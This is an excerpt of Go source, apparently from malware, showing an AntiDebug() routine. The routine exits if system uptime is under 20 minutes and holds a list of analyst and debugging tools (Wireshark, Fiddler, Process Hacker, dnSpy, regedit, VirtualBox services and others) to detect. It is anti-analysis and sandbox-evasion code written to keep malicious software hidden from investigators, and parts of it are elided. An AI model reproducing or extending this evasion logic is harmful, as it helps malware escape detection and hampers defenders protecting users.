...
var (
	...
	//remade this lol cuz ffs yk, fuck cgo cuz it keeps fucking me in the ass so lets work w/out it
...
func AntiDebug() {
	for {
		...
		// pc uptime TODO PURE GO
		heh, _, _ := getTickCount.Call()
		if heh/1000 < 1200 {
			os.Exit(-1)
		}
		...
		ptk := []string{"taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"}
